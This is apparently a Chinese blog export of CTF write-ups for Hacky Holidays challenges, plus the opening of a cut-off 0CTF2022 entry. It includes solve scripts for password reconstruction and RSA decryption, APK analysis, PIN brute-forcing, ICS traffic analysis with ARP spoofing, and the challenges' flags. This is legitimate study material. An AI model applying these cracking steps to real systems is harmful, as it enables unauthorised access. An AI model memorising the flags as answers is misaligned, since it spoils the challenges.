punctuation">(</span>password<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token number">0x40</span><span class="token punctuation">)</span>password<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>password<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">40</span><span class="token punctuation">)</span>password<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>password<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token number">7</span><span class="token punctuation">)</span>password<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>password<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">19</span><span class="token punctuation">)</span>password<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">*</span><span class="token builtin">ord</span><span class="token punctuation">(</span>password<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">29</span><span class="token punctuation">)</span>password<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>password<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token number">5</span><span class="token punctuation">)</span>password<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>password<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">53</span><span class="token punctuation">)</span>password<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>password<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">68</span><span class="token punctuation">)</span>password<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>password<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">ord</span><span class="token punctuation">(</span>password<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>password<span class="token punctuation">[</span><span class="token number">29</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>password<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">77</span><span class="token punctuation">)</span>password<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">*</span><span class="token builtin">ord</span><span class="token punctuation">(</span>password<span class="token punctuation">[</span><span class="token number">29</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">3</span><span class="token punctuation">)</span>password<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>password<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">33</span><span class="token punctuation">)</span>password<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>password<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">ord</span><span class="token punctuation">(</span>password<span class="token punctuation">[</span><span class="token number">29</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>password<span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">*</span><span class="token builtin">ord</span><span class="token punctuation">(</span>password<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>password<span class="token punctuation">[</span><span class="token number">27</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>password<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>password<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>password<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> password<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">==</span><span class="token boolean">None</span><span class="token punctuation">:</span>     <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>target <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>password<span class="token punctuation">)</span><span class="token comment">#print(str(password))</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>结果为：<code>CTF&#123;7a0QfB8dr1cF293Oy5a9fk9ŤA01c&#125;</code>，但是Ť这个字符很明显不是ASCII编码，在仔细观察之后，发现这个字符十进制数表示为356，模256之后的结果为100。对应的字符为d</p><p>那正确的结果为</p><pre class="line-numbers language-none"><code class="language-none">CTF&#123;7a0QfB8dr1cF293Oy5a9fk9dA01c&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="3-5-PIZZA-PAZZI"><a href="#3-5-PIZZA-PAZZI" class="headerlink" title="3-5 PIZZA PAZZI"></a><strong>3-5 PIZZA PAZZI</strong></h3><p>题目提供了一个apk文件。利用jadx进行反编译，并找到程序入口位置。根据第一题的题目，Listening in on the conversation。我们将apk文件使用keytool生成jks，再用apksigner完成v2签名，随后安装到雷电模拟器的安卓系统中。</p><p>然后使用fiddler4监控雷电模拟器发出的数据包，找到了<a href="https://pizzapazzi.challenge.hackazon.org/%EF%BC%8C%E8%AE%BF%E9%97%AE%E4%B9%8B%E5%90%8E%E5%BE%97%E5%88%B0%E7%AC%AC%E4%B8%80%E5%85%B3%E7%9A%84%E7%AD%94%E6%A1%88%E3%80%82">https://pizzapazzi.challenge.hackazon.org/，访问之后得到第一关的答案。</a></p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/u_muE2nJRY2-WAioI6IVTw.png" alt="20"></p><p>第二关，按照网页中显示的提示，我们可以阅读代码，从中得到更多的信息。这里我走了很多弯路，我一直以为是要动态调试这个app，但是打开之后点击Get started之后，app自动关闭。我开始怀疑是雷电模拟器版本的问题，随后下载了Android studio并安装Nexus5x的安卓模拟器，在该系统上面安装之后依然还是打不开。</p><p>之后没得办法又重新回到代码中，怀疑这些字符串是base64编码，解码之后后面的题目就迎刃而解啦。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/36NgagSGpYKpFXPjuHcAAA.png" alt="21"></p><p>所以又重新回到代码上，去寻找恶意代码。这里又走了弯路，这个app本身就是不完整的。其实在函数名称设置上已经有了提示。接下来的关卡都是一样的。采用的都是base64编码，模拟的就是后台挖矿的程序。</p><p>第三关</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/J4EBRWJm2Qeeu94w9gcEiw.png" alt="22"></p><p>第四关</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/iSLzfxsxfi72lIhl4zV18g.png" alt="23"></p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/F6z7pc4n98L2NXa6IkYxPg.png" alt="24"></p><h3 id="4-3-IDENTIFY-YOURSELF"><a href="#4-3-IDENTIFY-YOURSELF" class="headerlink" title="4-3 IDENTIFY YOURSELF"></a><strong>4-3</strong> <strong>IDENTIFY YOURSELF</strong></h3><p>这个题要根据题目中提供的DigitalId.apk，找出session.raw中保存的flag。</p><p>首先还是通过jadx对该apk文件进行反编译。通过反编译之后的代码，我们可以得到程序采用了AES对称加密的方式。先利用UUID生成的 32bytes 随机的十六进制字符串，对密文进行加密。再通过用户输入的PIN（4个拼接到一起的，每个4bytes，组到一起刚好是16bytes），对UUID进行加密。</p><p>然后，尝试通过在反编译之后的代码中寻找有关PIN的信息。发现并没有相关的信息。通过尝试安装软件运行发现，PIN中仅仅支持数字输入，所以呢，我们采取爆破的方式。</p><p>利用kali虚拟机生成包含4位数字的所有组合，再通过一样的解密过程，将密文解密出来。最终在发现1337即为PIN，也找到了最终的Flag。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/image(13).png" alt="25"></p><p>此题，思路并没有多大的问题，但是由于本人对基础知识的认识不够。所以走了很多弯路。</p><p>首先，所有的字符串在内存中都是以二进制存储的，十六进制形式只是其诸多展现形式中的一种而已(此外还有8进制等)。在程序语言中，将字符串转为十六进制字符串，即是将字符串在内存当中存储的二进制—-以十六进制形式展现出来。如果把real_key以十六进制展示出来的话，会是 ce1feee3……等等。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/QkVIgwLK8_8Qd5W5PQMt7A.png" alt="26"></p><p>接着，如何对这些二进制编码，是编码层面的问题，这里面有大家所熟知的Ascii码，UTF-8，UTF-16等等。这些编码说白了，就是按照自己的规则去读取内存中的二进制，然后查找该二进制对应的字母或者其他控制符等等。显然一个字节byte能标识的数据显然不够，所以又出现了UTF-16、Unicode编码等。不过对于英文的话，UTF-8编码是足够了。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/rRV9NCsAVIF8kyedReM_YQ.png" alt="27"></p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a><strong>Crypto</strong></h2><h3 id="2-1-ENCAPSULATION"><a href="#2-1-ENCAPSULATION" class="headerlink" title="2-1 ENCAPSULATION"></a><strong>2-1</strong> <strong>ENCAPSULATION</strong></h3><p>这是一道关于简单密码学加解密的题目，共分为三关：Encapsulation、Cipher Squabble 以及 Back to the basics。</p><p>第一关是一道简单的编码转化题。题目首先提供了一张图片 “binary.jpeg” ，直接打开发现并没有什么线索，进一步我们使用记事本打开，发现里面全是字符 “ ( “ 和 “ 9 “，由于只有两种符号，开始猜测为摩斯电码，解码发现并不成功，后来结合图片名称，将其理解为二进制，于是将其分别转为 “ 0 “ 和 “ 1 “ 进行表示，并需要考虑如何转换成带有字母符号的字符串，于是转换成 ASCII ，得到一串新的代码。（bin2Ascii）</p><p>此时查看新的代码发现，存在最后一位为 “ = “，考虑 base64 编码，进行解码后得到 flag。（baseX解码）</p><pre class="line-numbers language-none"><code class="language-none">CTF&#123;UGVwcGFpc2FwaWc&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>第二关为简单的密码解密题。根据前一题得到的解密结果，能够发现一定线索。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/image(2).png" alt="28"></p><p>其中第一个人是密码学家，并且搜索发现与之相关的密码加密方式为 “维吉尼亚密码” ，而改密码需要一个 Key 来帮助解密，句中提及他的中间名可以帮助，因此得到 “ Battista “，最后进行解密得到 flag。（维吉尼亚解密）</p><pre class="line-numbers language-none"><code class="language-none">CTF&#123;QMVSBGFZB2LUDMVUDGVKDGhPC2NPCGHLCG&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>第三关<strong>Uncompleted。</strong>同样是密码解迷题。根据前一题得到的解密结果，能够发现一定线索。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/image(3).png" alt="29"></p><p>暂时猜测他 shuffle 的意思是某种换序加密，想到格栅密码，但是尝试并未找的 flag，同时认为他所提到的 cylinder 是某种轮盘加密，暂时不知道使用什么进行解密。</p><h3 id="2-2-SECRET-CONVE’RSA’TION"><a href="#2-2-SECRET-CONVE’RSA’TION" class="headerlink" title="2-2 SECRET CONVE’RSA’TION"></a><strong>2-2</strong> <strong>SECRET CONVE’RSA’TION</strong></h3><p>这是一道关于 RSA 计算的题目，仅一关。</p><p>本关卡提供了一个文件，包含了 RSA 计算中的公钥（N，e）以及密文 c。提供的参数较少，仅有密钥和密文，理论上是很难破解的，需要我们爆破算出两个因数 p 和 q，由于数字十分巨大爆破不好实现，因此首先考虑一些方法进行分解，经查询有以下几种情况及算法。</p><ol><li>N 较小：短除法、Miller-Rabin素性测试和离散对数Pollard_rho分解；</li><li>N 较大：在线查询 <a href="http://factordb.com/">http://factordb.com</a></li><li>e 过大或过小：Wiener’s attack</li><li>p 和 q 相近：费马分解</li></ol><p>参考文档：CTF-RSA 大整数分解</p><p>因此我首先首先尝试了费马分解，并成功获取 p 和 q，进而求得 phi 和 d，最后根据公式 m = pow(c, d, n) 获取明文。</p><p>代码如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> libnump <span class="token operator">=</span> <span class="token number">72539188337409048434517657668785982436503618029818802387833126880251213106684983301847459281756173872849655980341983435213476251581941251979385718844779855101287148374206957436458915587712518501281793789555480805845328694482152421962093714097210685267495028743960484986044572019270471629952251128834754752071</span>q <span class="token operator">=</span> <span class="token number">72539188337409048434517657668785982436503618029818802387833126880251213106684983301847459281756173872849655980341983435213476251581941251979385718844779768486519862521371761417707655650528352916168732086751886502287478577426433344249124093776641317837723657300923622528678618140782421245730805689484709681027</span>e <span class="token operator">=</span> <span class="token number">65537</span>n <span class="token operator">=</span> <span class="token number">5261933844650100908430030083398098838688018147149529533465444719385566864605781576487305356717074882505882701585297765789323726258356035692769897420620858774763694117634408028918270394852404169072671551096321238430993811080749636806153881798472848720411673994908247486124703888115308603904735959457057925225503197625820670522050494196703154086316062123787934777520599894745147260327060174336101658295022275013051816321617046927321006322752178354002696596328204277122466231388232487691224076847557856202947748540263791767128195927179588238799470987669558119422552470505956858217654904628177286026365989987106877656917</span>c <span class="token operator">=</span> <span class="token number">176955087574615470063741472647197409875117482285309340581271852382710990213049325727125711804231234813146490233229473679126800639397642380073858980601348297248196895714845780751708931869367483971257602632592317987276609144131149239628356913355893753937582033295526684103570648143766629320982809943886265840131929175495923219383837739522744946987913271495217642469261483099144404131616847257182856944641353523297845726161862062019653065904612865722942649827600090466968124488518262272506900322544403300651512798674316560281124899873116026534973842919190849918357740307152880452169695889599662477611952919511642717417</span>phi <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>d <span class="token operator">=</span> libnum<span class="token punctuation">.</span>invmod<span class="token punctuation">(</span>e<span class="token punctuation">,</span>phi<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span>m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"m的值为:"</span><span class="token punctuation">,</span> m<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>求得 m 后，根据提示 flag 为 CTF{xxx}，根据获得 m 前两位为 67，猜测需要转为 ASCII 码，转换后成功获取 flag。</p><pre class="line-numbers language-none"><code class="language-none">CTF&#123;RSA_br0ken&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id=""><a href="#" class="headerlink" title=""></a></h2><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a><strong>Misc</strong></h2><h3 id="1-3-AUDIBLE-TRANSMISSION"><a href="#1-3-AUDIBLE-TRANSMISSION" class="headerlink" title="1-3 AUDIBLE TRANSMISSION"></a><strong>1-3</strong> <strong>AUDIBLE TRANSMISSION</strong></h3><p>这是一道音频wav的隐写题目，分为两关：For your eyes only 以及 Code。</p><p>第一关是频谱隐写，使用工具Audacity即可查看音频的频谱图拿到flag. 其实无论是频谱隐写还是波形隐写其音频听起来都是异常的，可以通过此方法来判断。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/BquF8GIbMHL0grUrZaxNwg.png" alt="30"></p><pre class="line-numbers language-none"><code class="language-none">CTF&#123;Tagalog&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>第二关<strong>Uncompleted</strong>，目前的猜测是出题人将一段code隐藏到中间的音频中啦。中间的音频听起来就是倒放，因此首先将整段音频使用Audacity提供的效果-&gt;反向（时间）来反转。但是处理之后听起来是清晰且顺畅的了，但是仍不知道是什么语言，在说什么。因为其内容上听起来没有杂音，所以猜想是使用某种成熟的对原音频影响较小音频隐写算法。目前尝试了Stegohide（Stegseek(密码爆破)），AudioStego以及LSB(wavStego，手写脚本)，但是生成的字节都是没有实义的。</p><h2 id="Network"><a href="#Network" class="headerlink" title="Network"></a>Network</h2><h3 id="1-1-CHEMICAL-PLANT"><a href="#1-1-CHEMICAL-PLANT" class="headerlink" title="1-1 CHEMICAL PLANT"></a><strong>1-1</strong> <strong>CHEMICAL PLANT</strong></h3><p>这同样是一道关于 ICS（工业控制系统） 流量分析的题目，共分为四关：Find the attack point、Record everything、Know the limit 以及 True or false。</p><p>第一关非常简单，需要我们找到受攻击的组件，flag 为 CTF{component}。根据视频我们能够发现，视频中 Pressure 部分一直增加超过了限度，导致了爆炸，因此这是被攻击的组件。</p><pre class="line-numbers language-none"><code class="language-none">CTF&#123;Pressure&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>第二关同样比较简单，需要我们找到受攻击的准确时刻。这里需要进行流量分析（Wireshark： “分析–&gt;专家信息”），能够发现作者在其中添加了 comment 为我们进行提示。打开便能够发现第二关到第四关的所有线索。其中对第二关的线索如下：</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/jvKaukugxsqAaNqx5m_8ag.png" alt="31"></p><p>同样我们能够看出为 base64 编码，解码后获取 flag。（baseX解码）</p><pre class="line-numbers language-none"><code class="language-none">CTF&#123;M0DBU5_RE4D_R1GHT&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>第三关<strong>Uncompleted</strong>，需要我们找到受攻击的设定值。其中对第三关的线索如下：</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/wjWgdnc7_QzcVmY6i8KlLQ.png" alt="32"></p><p>但是还是没搞懂这个指的设定值是说什么。</p><p>第四关，需要我们找到寄存器线圈中的数据类型，flag 为 CTF{datatype}。根据第二关线索可知其数据类型为 binary，如下：</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/0_UyX98l5vObVLrL66DyFw.png" alt="33"></p><p>其次他也呼应了题目的名称 True or false。</p><pre class="line-numbers language-none"><code class="language-none">CTF&#123;binary&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="1-2-YOU-CAN’T-SEE-ME"><a href="#1-2-YOU-CAN’T-SEE-ME" class="headerlink" title="1-2 YOU CAN’T SEE ME"></a><strong>1-2</strong> <strong>YOU CAN’T SEE ME</strong></h3><p>这是一道关于 ICS（工业控制系统） 流量分析的题目，共分为四关：Parts make a whole、whoami、Man-in-the-middle 以及 Follow me till the end。</p><p>第一关是一个数据流追踪的问题。根据题目名称我们可以推测出需要将分散的数据包进行追踪，同时我们可以发现大多为 TCP 数据包，因此我们将 TCP 流进行追踪（Wireshark：” 分析–&gt;追踪流–&gt;TCP” ），接着我们进行翻阅可以看到 flag。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/image(4).png" alt="34"></p><pre class="line-numbers language-none"><code class="language-none">CTF&#123;Hacky_Holidays_ICS&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>第二关是一个异常流量寻找的问题，flag 为 IP 地址。我们需要找到异常的组件，我的方法不一定准确（可能碰运气），我最开始是查看了流量图。（Wireshark：”统计”–&gt;”流量图”）发现有个内部 IP 频繁与外界 IP 进行数据交换，尝试发现正确。</p><pre class="line-numbers language-none"><code class="language-none">192.168.198.128<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>第三关是寻找中间人攻击使用的协议，flag 为 CTF{protocol_in_capital_letters}。然后我思考了一下常见的中间人攻击方式，首先想到的是 ARP 欺骗，正确。</p><pre class="line-numbers language-none"><code class="language-none">192.168.198.136 -- 00:0c:29:7f:db:1c192.168.198.138 -- 00:0c:29:80:8c:09192.168.198.128 -- 00:0c:29:2a:0b:dd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>但是需要验证为什么，我查询了 ARP 的数据包，发现 136 向内部网关询问 138 的地址，网关开始询问大家 138 的地址，而 128 一直向网关传递的是自己的地址，于是 136 将 128 认为是 138 的地址，从而完成了欺骗，使 128 成为了中间人（136 – 128 –138）。</p><pre class="line-numbers language-none"><code class="language-none">CTF&#123;ARP&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>第四关 寻找目标机器与外部机器之间沟通的报文，主要使用了(右键选择追踪流-&gt;追踪TCP流)，再不断增加流编号的过程中，发现了339流中存在HTTP协议报文。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/image(5).png" alt="35"></p><p>将该报文中的HTML源码复制到txt文件中再重新命名为html，打开之后即可得到flag–是一个由base64编码的图片。（筛选的过程中一度怀疑TSL协议流中蕴含着flag，想要通过数据包中传递的密钥破解数据包中加密传递的信息。但从理论上来说仅从数据包破解TSL协议的可能性不大，包中传递的也都是公钥。）</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/g1biwI-jXY-HY_QDEDFCOQ.png" alt="36"></p><pre class="line-numbers language-none"><code class="language-none">CTF&#123;5ERVER_15_H3R3&#125;        <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="PPC"><a href="#PPC" class="headerlink" title="PPC"></a><strong>PPC</strong></h2><p>Professionally Program Coder，即编程类题目。</p><h3 id="2-4-LOCATION-ANALYSIS"><a href="#2-4-LOCATION-ANALYSIS" class="headerlink" title="2-4 LOCATION ANALYSIS"></a><strong>2-4</strong> <strong>LOCATION ANALYSIS</strong></h3><p>首先此题给出的目标服务器是tcp:portal.hackazon.org:17002，结合题目的描述猜想是某数据库的借口。直接用telnet模拟tcp连接进行交互，发现如下的字符互动信息，可以被当作指纹去查看背后是什么数据库在运行。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/1Eauo0DZSOdtkfWORB6_-A.png" alt="37"></p><p>简单搜索后发现是Redis数据库，连接上查看所有的Key，发现其中的存在”_flag”的键，查看其的值就可以得到第一关的flag。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/lYTwnjSB7DIci-cYI-S5lg.png" alt="38"></p><pre class="line-numbers language-none"><code class="language-none">CTF&#123;DGErbbodqEeHQhjeDs8g&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>为了解决第二关，我们重新梳理下题目的情景。我们所连接的Redis数据库存储城市中自动驾驶车辆的实时位置的数据库，数据在实时更新，需要我们对数据进行分析。接着，在连接数据库后我们使用info命令对该题目的出题方式进行分析。我们可以看到实时的连接数，猜想后端只有一个共用的Redis，将其6379号端口映射到不同的端口供选手连接。所以我们应该是需要对数据库中的数据进行分析并找出flag。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/-JkxAyrzD7W_brYtyyRvHA.png" alt="39"></p><p>通过简单的分析可以发现，该数据库中一共有存储着1000个车辆的实时位置信息。数据库中的每个Key即车辆信息通过Json形式的数据结构保存，包括了其车牌号、经、纬度坐标。因为车辆的坐标是实时更新的，所以最直接的想法是将一段时间每个车的轨迹先画出来，看看有没有什么蛛丝马迹可循。</p><p>连接数据库并间隔一定时间保存每个车辆的的位置，最后绘制多点的轨迹图，我们可以发现一串类似于flag的车辆轨迹如下所示。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/image(15).png" alt="40"></p><p>接着，为了看得更清楚，我通过点的移动距离可以筛选出构成flag的点，并且调小了时间间隔。同时由于该图是由车的轨迹构成，所以我自然而然想绘制动态图片来搞清楚此flag是如何绘制的，这可能有助于我猜测各个位置的字母和数字是什么。所以，我得到了如下的gif图片，我们可以隐约地看到flag，但是很多位置并不明确，只能靠猜。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/gif.gif" alt="41"></p><p>但是还是不明确，经过meishijia的提醒下，我把横纵坐标的比例调成了一致使得每个字母更加协调。此时可以猜测出大部分的字符，但是有些位置还是无法确定。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/image(14).png" alt="42"></p><p>最后在meishijia的点拨下，我把轨迹图更换成了散点图，这样产生噪音的一些线条就被去除，最终得到了Flag。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/XVRgPPl5ovYE2NUpVH9zDQ.jpeg" alt="43">     </p><p>此题留给我的经验是：做题时不能急功近利，要多思考，小心尝试。在得到倒数第二张图时，我觉得答案已经呼之欲出，所以一直在猜测每个位置的字符，并尝试爆破。这其实花费了不少时间，最终也没有得到正确的Flag.但是如果能观察图片的构成，思考别的呈现方式，去除连线轨迹产生的噪音，将折线图改为散点图，其实答案就自然而然地呈现啦。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 比赛 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Writeup for 0CTF2022</title>
      <link href="/2022/08/04/writeup-0ctf-2022/"/>
      <url>/2022/08/04/writeup-0ctf-2022/</url>
      
        <content type="html"><![CDATA[<h1 id="Rev"><a href="#Rev" class="headerlink" title="Rev"></a>Rev</h1><h2 id="Baby-Encoder—-未完成"><a href="#Baby-Encoder—-未完成" class="headerlink" title="Baby Encoder—-未完成"></a>Baby Encoder—-未完成</h2><h3 id="自己"><a href="#自己" class="headerlink" title="自己"></a>自己</h3><h4 id="主逻辑"><a href="#主逻辑" class="headerlink" title="主逻辑"></a>主逻辑</h4><ol><li>利用 <code>\dev\urandom</code>随机生成了 <code>0x40</code> 的随机数字，并且对这些随机数字进行了线性变化。<br><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220918153242.png" alt="1"></li><li>基于buf中八个字节，进行一系列运算，产生 <code>128</code>个double类型的数据到 <code>int_64 v6[1024]</code>中去。<br><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220918153539.png" alt="2部分函数"></li><li>打印输出 <code>v6</code>中的内容，并且从标准输入中读取 <code>64个字节</code>，与 <code>buf前64个字节</code>进行对比，如果相同则输出flag。</li></ol><h4 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h4><p>通过观察发现 